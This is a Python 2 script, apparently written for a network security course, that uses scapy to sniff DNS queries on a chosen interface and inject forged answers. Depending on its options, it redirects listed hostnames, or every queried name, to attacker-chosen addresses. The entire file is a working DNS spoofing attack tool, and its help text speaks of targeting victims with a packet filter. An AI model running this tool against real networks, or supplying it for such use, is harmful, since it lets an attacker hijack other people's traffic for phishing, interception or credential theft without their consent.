#!/usr/bin/env python
from scapy.all import *
import argparse
import socket

from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import IP, UDP
import netifaces as ni

hosts = {}
s = None
my_ip = '127.0.0.1'


def id_generator(size=6, chars=string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))


def dns_spoof(pkt):
    global s, hosts, my_ip
    spoofed_ip = None
    if pkt.dport == 53 and UDP in pkt and DNSRR not in pkt:
        print('query for: ' + pkt[DNSQR].qname)
        if pkt[DNSQR].qname[:-1] in hosts:
            spoofed_ip = hosts[pkt[DNSQR].qname[:-1]]
            print('will inject')
        elif len(hosts) == 0:
            spoofed_ip = my_ip
        else:
            print('wont inject')
            return

        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) \
                      / UDP(dport=pkt[UDP].sport, sport=53) \
                      / DNS(id=pkt[DNS].id,
                            qr=1L,
                            qd=DNSQR(qname=pkt[DNSQR].qname),
                            an=DNSRR(rrname=pkt[DNS].qd.qname, rdata=spoofed_ip)
                            )

        sent = s.sendto(str(spoofed_pkt), (pkt[IP].src, pkt[UDP].sport))
        if sent < 1:
            print('There was a problem sending.')
        else:
            print('injected')


def main():
    global s, my_ip
    parser = argparse.ArgumentParser(description='DNS spoofer.')

    parser.add_argument('-i', help='Listen on network device <interface> (e.g., eth0). If not specified,\
                        dnsinject should select a default interface to listen on. The same\
                        interface should be used for packet injection.', type=str,
                        required=False, default=None)

    parser.add_argument('-f', help="Read a list of IP address and hostname pairs specifying the hostnames to\
                        be hijacked. If '-f' is not specified, dnsinject should forge replies for\
                        all observed requests with the local machine's IP address as an answer.",
                        type=str, required=False, default=None)

    parser.add_argument('expression', help="A BPF filter that specifies a subset of the traffic to be\
                        monitored. This option is useful for targeting a single or a set of particular\
                        victims.",
                        type=str, default=None)

    args = parser.parse_args()
    print args

    if args.f is not None:
        f = open(args.f, 'r')
        for line in f:
            line = line.split()
            if len(line) != 2:
                continue
            hosts[line[1].strip()] = line[0].strip()

        f.close()
    print(hosts)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except socket.error, msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()

    if args.i is None:
        my_ip = ni.ifaddresses(conf.iface)[2][0]['addr']
    else:
        my_ip = my_ip = ni.ifaddresses(args.i)[2][0]['addr']


    sniff(iface=args.i, filter=args.expression, prn=dns_spoof, lfilter=lambda x: x.haslayer(DNSQR))


if __name__ == "__main__":
    main()
